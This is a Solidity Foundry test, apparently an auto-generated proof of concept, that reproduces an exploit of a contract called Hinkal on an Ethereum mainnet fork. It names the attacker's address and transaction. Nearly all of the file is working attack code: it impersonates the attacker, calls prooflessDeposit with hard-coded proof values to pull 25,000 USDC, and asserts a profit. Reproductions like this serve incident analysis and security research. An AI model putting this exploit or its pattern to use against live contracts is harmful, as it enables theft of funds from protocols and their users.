// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0xbb3f01a1b1c68f3deb36c55342b5f5706c32fc20
// Attack Contract : 0x25e5e82f5702a27c3466fe68f14abdbbadfca826
// Vulnerable Contract : 0x25e5e82f5702a27c3466fe68f14abdbbadfca826
// Attack Tx : 0xbf7252af56be8867a12e27cc332f85e8f39e906756e559d6a076dc8bd9d50008
// Block : 25448306
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 25K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.Hinkal;
    uint256 constant FORK_BLOCK = 25448305;
    uint256 constant TX_TIMESTAMP = 1783037243;
    uint256 constant TX_BLOCK_NUMBER = 25448306;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareProfit(ATTACK_CONTRACT, address(0));
        _logBalances("Before exploit");

        ProofPoint[] memory proofPoints = new ProofPoint[](1);
        proofPoints[0] = ProofPoint({
            field0: 0x232ff4c7f639b52e1fe771531e2a338ee30adf7bf977064733ff7582a5533b90,
            field1: 0x2b46478c0c7ecce0b7d7b4bc1ebbe353fc6e75fe69adcdb03dcc06b45d8ed047,
            field2: 0x1036fbbdf2f35069a001c0f08e939b8717400a91b1f3ac4a79f7996872b4daa7,
            field3: 0x23f9dcb46993215e6581e3a5e8dd6292703dfda6c7c05cd4131babdd8b01cfdf
        });

        IHinkal(Addresses.Hinkal).prooflessDeposit{value: TX_VALUE}(
            _addressArray1(Addresses.USDC), _uintArray1(25000000000), _uintArray1(0), proofPoints
        );

        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _expectProfitLegs(address attackSurface, address attackChild) internal override {
        attackSurface;
        attackChild;
        _expectProfit(Addresses.Hinkal, attackSurface, Addresses.USDC, "USDC", 25000000000);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant Hinkal = 0x25e5e82f5702A27C3466fE68f14abDbbAdFca826;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant attacker_eoa = 0xbB3f01a1b1C68F3DEB36C55342b5F5706c32fc20;
}

struct ProofPoint {
    uint256 field0;
    uint256 field1;
    uint256 field2;
    uint256 field3;
}

interface IHinkal {
    function prooflessDeposit(address[] calldata, uint256[] calldata, uint256[] calldata, ProofPoint[] calldata)
        external
        payable;
}

function _addressArray1(address a0) pure returns (address[] memory out) {
    out = new address[](1);
    out[0] = a0;
}

function _uintArray1(uint256 a0) pure returns (uint256[] memory out) {
    out = new uint256[](1);
    out[0] = a0;
}
